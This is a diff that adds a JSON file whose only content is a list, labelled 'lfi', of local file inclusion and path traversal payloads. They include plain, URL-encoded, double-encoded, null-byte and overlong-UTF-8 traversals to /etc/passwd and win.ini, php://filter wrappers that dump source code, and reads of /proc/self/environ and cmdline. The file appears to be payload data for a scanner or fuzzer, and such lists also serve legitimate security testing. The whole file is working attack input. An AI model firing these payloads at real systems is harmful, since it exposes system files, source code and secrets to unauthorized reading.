@@ -1,0 +1,26 @@
+{
+  "lfi": [
+    "../../../../etc/passwd",
+    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "....//....//....//....//etc/passwd",
+    "..%252f..%252f..%252f..%252fetc%252fpasswd",
+    "../../../../etc/passwd%00",
+    "..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
+    "....%5C....%5C....%5C....%5Cwindows%5Cwin.ini",
+    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+    "..%c0%af..%c0%af..%c0%afetc/passwd",
+    "..%c1%9c..%c1%9cetc/passwd",
+    "%252e%252e%252f",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
+    "php://filter/read=string.rot13/resource=index.php",
+    "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
+    "file:///etc/passwd",
+    "/etc/passwd",
+    "/proc/self/environ",
+    "/proc/self/cmdline",
+    "/proc/self/cwd/",
+    "/proc/self/root/etc/passwd"
+  ]
+}
